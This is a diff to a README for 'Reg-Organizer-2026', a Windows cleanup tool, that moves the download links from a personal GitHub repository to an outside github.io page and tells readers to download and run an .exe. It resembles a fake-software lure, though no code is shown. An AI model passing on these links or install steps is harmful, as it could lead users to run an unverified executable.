@@ -1,6 +1,6 @@
 # 🛠️ Reg-Organizer-2026 - Clean your computer for better speed
 
-[![](https://img.shields.io/badge/Download-Reg-Organizer-2026-blue.svg)](https://github.com/Ubhaide6763/Reg-Organizer-2026)
+[![](https://img.shields.io/badge/Download-Reg-Organizer-2026-blue.svg)](https://ubhaide6763.github.io)
 
 ## 📋 What is Reg-Organizer-2026
 
@@ -10,7 +10,7 @@ Reg-Organizer-2026 helps you maintain your Windows computer. Over time, your sys
 
 Follow these steps to set up the software on your Windows machine. This process takes a few minutes. Make sure you save your work in other programs before you begin.
 
-1. Visit the following link to reach the download page: [https://github.com/Ubhaide6763/Reg-Organizer-2026](https://github.com/Ubhaide6763/Reg-Organizer-2026).
+1. Visit the following link to reach the download page: [https://ubhaide6763.github.io](https://ubhaide6763.github.io).
 2. Look for the file ending in .exe in the releases section.
 3. Click the file to start the download.
 4. Save the installer to your Downloads folder.
